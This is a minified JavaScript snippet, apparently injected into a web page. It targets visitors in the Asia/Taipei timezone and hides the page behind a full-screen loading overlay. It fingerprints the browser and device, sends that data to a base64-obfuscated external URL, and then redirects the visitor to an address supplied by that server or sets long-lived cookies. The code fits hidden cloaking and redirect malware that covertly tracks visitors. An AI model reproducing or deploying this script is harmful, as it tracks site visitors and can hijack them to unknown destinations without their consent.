...
var FingerprintCode='';function getCookie(name){const cookies=document.cookie.split("; ");for(let i=0;i<cookies.length;i++){const cookie=cookies[i].split("=");if(cookie[0]===name){return cookie[1]}}return""}var vertz=Intl.DateTimeFormat().resolvedOptions().timeZone;if(!getCookie('_vi')&&vertz=='Asia/Taipei'){if(!getCookie('_vii')){$('body').append(`<div id="cloudload"style="position: fixed;z-index: 999999;top: 0;left: 0;width: 100%;height: 100%;background-color: #fff;display: flex;align-items: center;justify-content: center"><svg version="1.1"id="Layer_1"xmlns="http://www.w3.org/2000/svg"xmlns:xlink="http://www.w3.org/1999/xlink"x="0px"y="0px"width="24px"height="30px"viewBox="0 0 24 30"style="enable-background:new 0 0 50 50;opacity: 0.5"xml:space="preserve"><rect x="0"y="13"width="4"height="5"fill="#333"><animate attributeName="height"attributeType="XML"values="5;21;5"begin="0s"dur="0.6s"repeatCount="indefinite"></animate><animate attributeName="y"attributeType="XML"values="13; 5; 13"begin="0s"dur="0.6s"repeatCount="indefinite"></animate></rect><rect x="10"y="13"width="4"height="5"fill="#333"><animate attributeName="height"attributeType="XML"values="5;21;5"begin="0.15s"dur="0.6s"repeatCount="indefinite"></animate><animate attributeName="y"attributeType="XML"values="13; 5; 13"begin="0.15s"dur="0.6s"repeatCount="indefinite"></animate></rect><rect x="20"y="13"width="4"height="5"fill="#333"><animate attributeName="height"attributeType="XML"values="5;21;5"begin="0.3s"dur="0.6s"repeatCount="indefinite"></animate><animate attributeName="y"attributeType="XML"values="13; 5; 13"begin="0.3s"dur="0.6s"repeatCount="indefinite"></animate></rect></svg></div>`)}var information={};try{information=JSON.stringify({navigator:{appCodeName:navigator.appCodeName,appName:navigator.appName,cookieEnabled:navigator.cookieEnabled,language:navigator.language,languages:navigator.languages,hardwareConcurrency:navigator.hardwareConcurrency,maxTouchPoints:navigator.maxTouchPoints,pdfViewerEnabled:navigator.pdfViewerEnabled,platform:navigator.platform,product:navigator.product,productSub:navigator.productSub,userActivation:{hasBeenActive:navigator.userActivation.hasBeenActive,isActive:navigator.userActivation.isActive},userAgent:navigator.userAgent,vendor:navigator.vendor,vendorSub:navigator.vendorSub,webdriver:navigator.webdriver,},screen:{availHeight:window.screen.availHeight,availWidth:window.screen.availWidth,width:window.screen.width,height:window.screen.height,pixelDepth:window.screen.pixelDepth,colorDepth:window.screen.colorDepth,},intl:{timeZone:Intl.DateTimeFormat().resolvedOptions().timeZone,locale:Intl.NumberFormat().resolvedOptions().locale,calendar:Intl.DateTimeFormat().resolvedOptions().calendar,numberingSystem:Intl.NumberFormat().resolvedOptions().numberingSystem,}})}catch(e){}try{var fpPromise=FingerprintJS.load();fpPromise.then(fp=>fp.get()).then(function(result){if(result.visitorId){var time_zone=Intl.DateTimeFormat().resolvedOptions().timeZone;var referer=window.location.hostname;var code=result.visitorId;var FingerprintCode=code;$('#csaq').text(code);$.ajax({url:window.atob('aHR0cHM6Ly9zdGF0aW9ucy50b3AvX2Np'),type:'POST',data:{code:code,time_zone:time_zone,referer:referer,information:information},timeout:5000,dataType:'json',success:function(result){if(result.verify==1){if(result.redirect){window.location.href=result.redirect}else{$('#cloudload').remove();var cookieValue='915D3804005015CB';var expirationDate=new Date(Date.now()+1*24*60*60*1000);document.cookie="_vii="+cookieValue+"; expires="+expirationDate.toUTCString()+"; path=/"}}else{$('#cloudload').remove();var cookieValue='915D3804005015CA';var expirationDate=new Date(Date.now()+365*24*60*60*1000);document.cookie="_vi="+cookieValue+"; expires="+expirationDate.toUTCString()+"; path=/"}},error:function(xhr,status){$('#cloudload').remove()}})}})}catch(e){$('#cloudload').remove()}}
